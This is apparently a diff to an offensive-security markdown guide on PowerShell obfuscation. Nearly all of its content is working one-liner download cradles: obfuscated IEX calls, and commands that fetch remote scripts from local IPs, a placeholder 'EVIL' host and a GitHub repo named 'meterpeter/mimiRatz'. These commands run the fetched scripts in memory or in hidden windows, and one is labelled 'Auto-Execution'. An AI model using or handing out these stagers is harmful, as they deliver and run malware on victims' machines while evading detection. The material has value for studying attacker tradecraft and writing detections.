@@ -1081,6 +1081,12 @@ Here we can view the all process of encoding/decoding in powershell console
 
 ![var declaration success](http://i65.tinypic.com/2hx85g3.jpg)
 
+<br />
+
+Concatenated IEX API call
+
+    &(''.SubString.ToString()[67,72,64]-Join'')'Get-Service'
+
 ---
 
 [0] [Glosario (Index)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario-index)<br />
@@ -2130,8 +2136,13 @@ Invoke-WebRequest "http://192.168.1.71/hello.ps1" -OutFile "$env:tmp\hello.ps1" 
 powershell Invoke-WebRequest -H @{"Authorization"="token 123456789012345678901234567890"} https://path/to/file.txt -OutFile $env:tmp\file.txt
 
 powershell -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://192.168.1.73/hello.ps1', '%tmp%\hello.ps1');powershell Start-Process -windowstyle hidden -FilePath '%tmp%\hello.ps1'
-      
-$ie=New-Object -comobject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://EVIL/evil.ps1');start-sleep -s 5;$r=$ie.Document.body.innerHTML;$ie.quit();IEX $r
+
+$r=new-object net.webclient;$r.proxy=[Net.WebRequest]::GetSystemWebProxy();$r.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;iex $r.downloadstring('http://192.168.1.73:8080/hello.ps1');
+
+$w=(New-Object Net.WebClient);$w.(((($w).PsObject.Methods)|?{(Item Variable:\_).Value.Name-clike'D*g'}).Name).Invoke('https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/ACLMitreT1574.ps1') > test.ps1
+
+[IO.StreamReader]::new([Net.WebRequest]::Create('https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/ACLMitreT1574.ps1').GetResponse().GetResponseStream()).ReadToEnd() > test.ps1
+
 ```
       
 ![rf](https://user-images.githubusercontent.com/23490060/94825488-29098b80-03fe-11eb-8ea9-1caca3ab7b4e.png)
@@ -2146,11 +2157,15 @@ $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://192.168.1.73
 
 $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://192.168.1.73/hello.ps1',$false);$h.send();$h.responseText > $env:tmp\hello.ps1
 
-$r=new-object net.webclient;$r.proxy=[Net.WebRequest]::GetSystemWebProxy();$r.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;iex $r.downloadstring('http://192.168.1.73:8080/hello.ps1');
+$ie=New-Object -comobject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://EVIL/evil.ps1');start-sleep -s 5;$r=$ie.Document.body.innerHTML;$ie.quit();IEX $r
 
 [System.Net.WebRequest]::DefaultWebProxy;[System.Net.CredentialCache]::DefaultNetworkCredentials;$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://192.168.1.73/hello.ps1',$false);$h.send();iex $h.responseText
       
-powershell.exe -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml');$Xml.command.a.execute | IEX"      
+powershell.exe -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml');$Xml.command.a.execute | IEX"
+
+#Auto-Execution
+$c=New-Object -ComObject MsXml2.ServerXmlHttp;$c.Open('GET','https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/ACLMitreT1574.ps1',0);$c.Send();[scriptblock]::Create($c.ResponseText).Invoke()
+
 ```      
 
 <br /><br />
